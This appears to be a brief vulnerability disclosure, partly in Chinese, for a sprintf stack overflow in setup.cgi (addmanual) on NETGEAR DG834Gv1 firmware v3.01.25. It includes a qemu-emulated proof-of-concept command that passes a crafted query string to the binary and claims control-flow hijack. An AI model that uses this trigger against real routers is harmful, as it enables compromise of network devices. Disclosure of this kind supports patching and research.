# NETGEAR-DG834Gv1-dg834_v3.01.25 stackoverflow

A buffer overflow vulnerability in /usr/sbin/setup.cgi on NETGEAR-DG834Gv1-dg834_v3.01.25 via addmanual(sub_40C20C)

![](./img/1.png)

存在sprintf栈溢出

# POC

```
sudo qemu-mipsel-static -E REQUEST_METHOD=GET -E QUERY_STRING="todo=addmanual&this_file=fw_rules.htm&wirelist_mac=killandhack&" -L ./ ./usr/sbin/setup.cgi
```

![](C:\Users\ASUSA\Desktop\新建文件夹\img\2.png)

通过上图可以看到成功劫持了程序执行流
